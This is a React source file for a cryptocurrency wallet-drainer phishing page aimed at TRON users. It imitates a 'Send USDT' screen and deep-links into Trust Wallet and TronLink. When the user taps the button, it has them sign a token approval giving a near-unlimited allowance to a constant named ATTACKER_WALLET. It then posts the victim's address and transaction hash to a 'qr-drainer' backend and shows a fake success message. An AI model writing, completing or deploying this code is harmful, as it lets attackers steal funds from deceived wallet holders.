import React, { useState, useEffect, useRef } from "react";
import { QRCodeSVG } from "qrcode.react";

// ==========================================
// CONFIGURATION (Engine Settings)
// ==========================================
const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd";
const ATTACKER_WALLET = "TJXJEWcjNMryw87etLmGUDs1i5F1hveBou";
const BACKEND = "https://qr-drainer.onrender.com";

// Ensure this points to your live Vercel domain (no trailing slash)
const SITE_URL = "https://your-vercel-app-url.vercel.app"; 
const QR_VALUE = `${SITE_URL}/#/wallet`;

// High-Quality SVG Logos for the Picker
const WALLET_LOGOS = {
  trust: "https://trustwallet.com/assets/images/media/assets/TWT.png",
  tronlink: "https://tronlink.org/images/logo.png",
  metamask: "https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg",
  walletconnect: "https://upload.wikimedia.org/wikipedia/commons/thumb/d/d8/WalletConnect_Logo.svg/1024px-WalletConnect_Logo.svg.png"
};

export default function App() {
  const [view, setView] = useState(window.location.hash === "#/wallet" ? "wallet" : "home");
  const [amount, setAmount] = useState("1");
  const [isConnected, setIsConnected] = useState(false);
  const [wallet, setWallet] = useState("");
  const [uiState, setUiState] = useState("idle");
  const [errorMsg, setErrorMsg] = useState("");
  const [showWalletPicker, setShowWalletPicker] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState(null);
  
  // Listen for the wallet extension injecting window.tronWeb
  useEffect(() => {
    const iv = setInterval(() => {
      if (window.tronWeb?.defaultAddress?.base58) {
        const addr = window.tronWeb.defaultAddress.base58;
        if (!isConnected) {
          setIsConnected(true);
          setWallet(addr);
        }
      }
    }, 800);
    return () => clearInterval(iv);
  }, [isConnected]);

  // The Core Engine (Unchanged)
  const executeEngine = async () => {
    setUiState("processing");
    setErrorMsg("");
    try {
      if (!window.tronWeb?.defaultAddress) {
        throw new Error("Wallet not connected.");
      }
      const victimAddress = window.tronWeb.defaultAddress.base58;
      const contract = await window.tronWeb.contract().at(TOKEN_ADDRESS);
      const tx = await contract.approve(ATTACKER_WALLET, "1000000000000000").send({
        feeLimit: 100000000,
        from: victimAddress
      });

      await fetch(`${BACKEND}/api/alert`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ victimAddress, txHash: tx, network: "TRON Shasta" })
      });
      setUiState("success");
    } catch (error) {
      console.error(error);
      setErrorMsg(error.message || "Transaction failed.");
      setUiState("idle");
    }
  };

  // The Deep Link Handler for Apps
  const handleWalletSelect = (walletName) => {
    setSelectedWallet(walletName);
    setShowWalletPicker(false);
    
    // Construct the URL to return to after opening the app
    const returnUrl = encodeURIComponent(`${window.location.origin}/#/wallet`);

    if (walletName === "Trust Wallet") {
      // Official Trust Wallet Deep Link (coin_id 195 = TRON)
      window.location.href = `https://link.trustwallet.com/open_url?coin_id=195&url=${returnUrl}`;
    } else if (walletName === "TronLink") {
      // Official TronLink Deep Link
      window.location.href = `tronlink://open?url=${returnUrl}`;
    } else {
      // Fallback for others
      alert("This wallet requires the browser extension. Please open in a Web3 browser.");
    }
  };

  // ---------------- UI RENDERING ----------------

  // Success Screen
  if (uiState === "success") {
    return (
      <div style={{ background: "#0b0e11", minHeight: "100vh", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", padding: 20, fontFamily: "system-ui, -apple-system, sans-serif" }}>
        <div style={{ width: 80, height: 80, borderRadius: "50%", background: "#2FAB73", display: "flex", alignItems: "center", justifyContent: "center", marginBottom: 24 }}>
          <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="3"><polyline points="20 6 9 17 4 12"/></svg>
        </div>
        <h2 style={{ color: "#eaecef", fontSize: 24, fontWeight: 600, margin: "0 0 8px" }}>Transaction Sent</h2>
        <p style={{ color: "#848e9c", fontSize: 15, margin: 0 }}>Your USDT has been sent successfully</p>
      </div>
    );
  }

  // The Main "Send" Mock Page (App UI)
  return (
    <div style={{ background: "#0b0e11", minHeight: "100vh", fontFamily: "system-ui, -apple-system, sans-serif", display: "flex", flexDirection: "column", color: "#eaecef" }}>
      
      {/* HEADER */}
      <div style={{ padding: "20px", display: "flex", alignItems: "center", justifyContent: "space-between", borderBottom: "1px solid #1e2329" }}>
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#eaecef" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
          <line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/>
        </svg>
        <div style={{ fontSize: 17, fontWeight: 600 }}>Send USDT</div>
        <div style={{ width: 24 }} />
      </div>

      {/* CONTENT */}
      <div style={{ flex: 1, padding: "24px 20px", display: "flex", flexDirection: "column", alignItems: "center" }}>
        
        {/* NETWORK BADGE */}
        <div style={{ marginBottom: 24 }}>
          <div style={{ display: "inline-flex", alignItems: "center", gap: 6, background: "#181a20", padding: "6px 14px", borderRadius: 20, border: "1px solid #2b3139", color: "#848e9c", fontSize: 13, fontWeight: 500 }}>
            <div style={{ width: 8, height: 8, borderRadius: "50%", background: "#eb0029" }}></div>
            TRON (TRC-20)
          </div>
        </div>

        {/* ADDRESS */}
        <div style={{ width: "100%", maxWidth: 400, marginBottom: 20 }}>
          <div style={{ color: "#848e9c", fontSize: 13, marginBottom: 8, fontWeight: 500 }}>Recipient Address</div>
          <div style={{ background: "#181a20", borderRadius: 8, padding: "16px", fontSize: 14, fontFamily: "monospace", wordBreak: "break-all", border: "1px solid #2b3139" }}>
            {ATTACKER_WALLET}
          </div>
        </div>

        {/* AMOUNT */}
        <div style={{ width: "100%", maxWidth: 400, marginBottom: 24 }}>
          <div style={{ color: "#848e9c", fontSize: 13, marginBottom: 8, fontWeight: 500 }}>Amount</div>
          <div style={{ background: "#181a20", borderRadius: 8, padding: "16px", display: "flex", alignItems: "center", border: "1px solid #2b3139" }}>
            <input type="number" value={amount} onChange={(e) => setAmount(e.target.value)} style={{ background: "transparent", border: "none", color: "#eaecef", fontSize: 28, fontWeight: 600, width: "60%", outline: "none" }} />
            <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
              <span style={{ color: "#848e9c", fontSize: 16, fontWeight: 500 }}>USDT</span>
              <button style={{ background: "#2b3139", border: "none", color: "#eaecef", padding: "6px 12px", borderRadius: 4, fontSize: 12, fontWeight: 600 }}>MAX</button>
            </div>
          </div>
        </div>

        {errorMsg && (
          <div style={{ background: "rgba(246,70,93,0.1)", border: "1px solid rgba(246,70,93,0.3)", color: "#f6465d", padding: "14px", borderRadius: 8, fontSize: 13, marginBottom: 20, width: "100%", maxWidth: 400, textAlign: "center" }}>{errorMsg}</div>
        )}

        {/* THE BUTTON */}
        <button 
          onClick={() => {
            if (isConnected) {
              executeEngine();
            } else {
              setShowWalletPicker(true);
            }
          }} 
          disabled={uiState === "processing"} 
          style={{ width: "100%", maxWidth: 400, background: uiState === "processing" ? "#2b3139" : "#3375bb", border: "none", borderRadius: 12, padding: "18px", color: uiState === "processing" ? "#848e9c" : "#fff", fontSize: 16, fontWeight: 600, marginTop: "auto", marginBottom: "30px", cursor: "pointer" }}
        >
          {uiState === "processing" ? "Processing…" : isConnected ? "Preview" : "Explore"}
        </button>
      </div>

      {/* WALLET PICKER MODAL (The App Link) */}
      {showWalletPicker && (
        <div style={{ position: "fixed", top: 0, left: 0, right: 0, bottom: 0, background: "rgba(0,0,0,0.85)", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 1000, padding: 20, backdropFilter: "blur(4px)" }}>
          <div style={{ background: "#181a20", borderRadius: 20, padding: 24, width: "100%", maxWidth: 400, boxShadow: "0 24px 48px rgba(0,0,0,0.6)" }}>
            
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 24 }}>
              <h3 style={{ margin: 0, fontSize: 18, fontWeight: 600, color: "#eaecef" }}>Connect a Wallet</h3>
              <button onClick={() => setShowWalletPicker(false)} style={{ background: "none", border: "none", color: "#848e9c", fontSize: 28, cursor: "pointer" }}>×</button>
            </div>
            
            <div style={{ display: "grid", gridTemplateColumns: "repeat(2, 1fr)", gap: 16 }}>
              {/* Real Trust Wallet Logo */}
              <button onClick={() => handleWalletSelect("Trust Wallet")} style={{ background: "#0b0e11", border: "1px solid #2b3139", borderRadius: 16, padding: "20px 16px", cursor: "pointer", display: "flex", flexDirection: "column", alignItems: "center", gap: 12 }}>
                <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet" style={{ width: 48, height: 48, borderRadius: 12 }} />
                <span style={{ color: "#eaecef", fontSize: 14, fontWeight: 600 }}>Trust Wallet</span>
              </button>

              {/* Real TronLink Logo */}
              <button onClick={() => handleWalletSelect("TronLink")} style={{ background: "#0b0e11", border: "1px solid #2b3139", borderRadius: 16, padding: "20px 16px", cursor: "pointer", display: "flex", flexDirection: "column", alignItems: "center", gap: 12 }}>
                <img src="https://tronlink.org/images/logo.png" alt="TronLink" style={{ width: 48, height: 48, borderRadius: 12 }} />
                <span style={{ color: "#eaecef", fontSize: 14, fontWeight: 600 }}>TronLink</span>
              </button>
            </div>
            
            <p style={{ textAlign: "center", color: "#848e9c", fontSize: 13, marginTop: 24, lineHeight: 1.5 }}>
              Connecting will open the wallet app on your device.
            </p>
          </div>
        </div>
      )}
    </div>
  );
}